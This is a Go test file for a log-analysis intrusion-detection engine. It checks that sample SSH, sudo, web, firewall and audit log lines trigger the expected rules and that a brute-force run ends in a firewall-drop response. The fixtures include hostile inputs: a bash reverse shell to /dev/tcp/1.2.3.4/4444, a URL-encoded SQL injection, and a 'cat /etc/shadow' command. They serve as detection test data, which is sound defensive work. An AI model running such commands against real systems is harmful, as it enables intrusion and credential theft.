package engine

import (
	"fmt"
	"testing"
	"time"
)

func load(t *testing.T) *Engine {
	t.Helper()
	e := New()
	if err := e.Load("../../../ruleset/decoders", "../../../ruleset/rules"); err != nil {
		t.Fatal(err)
	}
	return e
}

func run(e *Engine, typ, line string, ts time.Time) *Result {
	ev := &Event{AgentID: "001", Type: typ, FullLog: line, Timestamp: ts, Location: "/var/log/test"}
	PreDecode(ev)
	return e.Analyze(ev)
}

func TestRules(t *testing.T) {
	e := load(t)
	now := time.Now()
	cases := []struct {
		typ, line string
		rule      int
		field     string
		value     string
	}{
		{"log", "Nov 19 10:00:01 web1 sshd[811]: Failed password for root from 203.0.113.9 port 50122 ssh2", 5717, "srcip", "203.0.113.9"},
		{"log", "Nov 19 10:00:01 web1 sshd[811]: Failed password for invalid user admin from 203.0.113.7 port 50122 ssh2", 5710, "dstuser", "admin"},
		{"log", "Nov 19 10:00:01 web1 sshd[811]: Accepted publickey for keshav from 10.0.0.5 port 40000 ssh2", 5715, "dstuser", "keshav"},
		{"log", "2026-11-19T10:00:01.123+05:30 web1 sudo:   keshav : TTY=pts/0 ; PWD=/home/keshav ; USER=root ; COMMAND=/usr/bin/apt update", 5402, "command", "/usr/bin/apt update"},
		{"log", "Nov 19 10:00:01 web1 sudo:   bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/cat /etc/shadow", 5405, "srcuser", "bob"},
		{"log", "Nov 19 10:00:01 web1 useradd[99]: new user: name=backdoor, UID=1002, GID=1002, home=/home/backdoor, shell=/bin/bash", 5902, "dstuser", "backdoor"},
		{"log", `198.51.100.4 - - [19/Nov/2026:10:00:01 +0530] "GET /item.php?id=1%27%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1" 200 512 "-" "Mozilla/5.0"`, 31103, "srcip", "198.51.100.4"},
		{"log", `198.51.100.4 - - [19/Nov/2026:10:00:01 +0530] "GET /admin HTTP/1.1" 404 12 "-" "sqlmap/1.7"`, 31160, "status", "404"},
		{"log", "Nov 19 10:00:01 fw kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00 SRC=192.0.2.50 DST=10.0.0.1 LEN=44 PROTO=TCP SPT=4444 DPT=22", 4101, "dstport", "22"},
		{"log", `{"timestamp":"2026-11-19T10:00:00","event_type":"alert","src_ip":"192.0.2.1","alert":{"severity":1,"signature":"ET EXPLOIT"}}`, 86601, "alert.signature", "ET EXPLOIT"},
		{"log", `type=EXECVE msg=audit(1700000000.123:42): argc=3 a0="bash" a1="-c" a2="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"`, 80792, "audit_type", "EXECVE"},
	}
	for i, c := range cases {
		r := run(e, c.typ, c.line, now.Add(time.Duration(i)*time.Minute*10))
		if r == nil {
			t.Fatalf("case %d: no rule matched for %q", i, c.line)
		}
		if r.Rule.ID != c.rule {
			t.Errorf("case %d: got rule %d (%s), want %d; fields=%v decoder=%s", i, r.Rule.ID, r.Rule.Description, c.rule, r.Event.Fields, r.Event.Decoder)
		}
		if c.field != "" && r.Event.Fields[c.field] != c.value {
			t.Errorf("case %d: field %s=%q want %q", i, c.field, r.Event.Fields[c.field], c.value)
		}
	}
}

func TestSyscheck(t *testing.T) {
	e := load(t)
	ev := &Event{Type: "syscheck", FullLog: "File '/etc/shadow' modified", Timestamp: time.Now(),
		Fields: map[string]string{"event": "modified", "path": "/etc/shadow"}}
	r := e.Analyze(ev)
	if r == nil || r.Rule.ID != 555 {
		t.Fatalf("want 555, got %+v", r)
	}
}

func TestBruteForceFrequency(t *testing.T) {
	e := load(t)
	base := time.Now()
	var last *Result
	for i := 0; i < 8; i++ {
		line := fmt.Sprintf("Nov 19 10:00:%02d web1 sshd[811]: Failed password for keshav from 203.0.113.66 port %d ssh2", i, 50000+i)
		last = run(e, "log", line, base.Add(time.Duration(i)*time.Second))
	}
	if last.Rule.ID != 5720 {
		t.Fatalf("expected brute-force rule 5720 on 8th failure, got %d", last.Rule.ID)
	}
	if last.Rule.ActiveResponse == nil || last.Rule.ActiveResponse.Command != "firewall-drop" {
		t.Fatal("expected firewall-drop active response")
	}
	// A different source must not inherit the counter
	r := run(e, "log", "Nov 19 10:00:30 web1 sshd[811]: Failed password for keshav from 203.0.113.67 port 1 ssh2", base.Add(10*time.Second))
	if r.Rule.ID != 5716 {
		t.Fatalf("expected 5716 for new source, got %d", r.Rule.ID)
	}
}
